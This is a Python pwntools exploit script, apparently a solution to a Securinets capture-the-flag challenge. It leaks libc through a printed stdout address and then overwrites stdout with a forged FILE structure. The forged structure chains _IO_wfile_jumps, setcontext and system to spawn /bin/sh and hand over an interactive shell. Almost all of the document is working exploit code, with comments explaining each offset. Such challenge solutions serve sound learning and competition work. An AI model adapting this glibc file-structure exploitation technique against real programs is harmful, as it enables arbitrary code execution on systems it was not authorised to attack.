#!/usr/bin/env python3

from pwn import *

exe = ELF('./main_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *_IO_flush_all
b *_IO_flush_all+319
b *_IO_flush_all+210
b *_IO_wdoallocbuf+35
'''

#p = remote("pwn-14caf623.p1.securinets.tn", 9002)
p = process('./main_patched')
#p = gdb.debug('./main_patched', gdbscript = script)
#debug()

rcu(b"stdout : ")
stdout = int(p.recvline(), 16)
libc_base = stdout - 0x1e85c0
lleak("libc_base", libc_base)

libc.address = libc_base

payload = flat(
        {
            0x10: stdout+0x18-0x68,# from this when +0x68 it will be in the next address
            0x18: libc.sym['setcontext'],
            0x20: 8*b'A', # just leave this, it bypasses some check
            0x58: b"/bin/sh\x00",
            0x60: stdout+0x58, # rdi in set context (overlaps with _chain for new fake struct) points to /bin/sh
            0x68: stdout-8, # stdout _chain pointing to fake struct that overlaps with stdout
            0x80: libc.address+0x1e97a0, # lock for fake io
            0x88: libc.address+0x1e97a0, # lock for stdout
            0x98: stdout - 0xd0,  # fake io: _wide_data->_wide_vtable (at offset 0x18 of this address must find wide_data->write_base which needs to be 0), this address when +0xe0 will be at stdout +0x10
            0xa0: libc.address + 0x52c92, # rcx in setcontext which will be pushed (it actually points somewhere in system, used this to solve stack alignment)
            0xd0: libc.sym["_IO_wfile_jumps"],  # vtable
        },
        filler=b"\x00",
    )
s(payload)

p.interactive()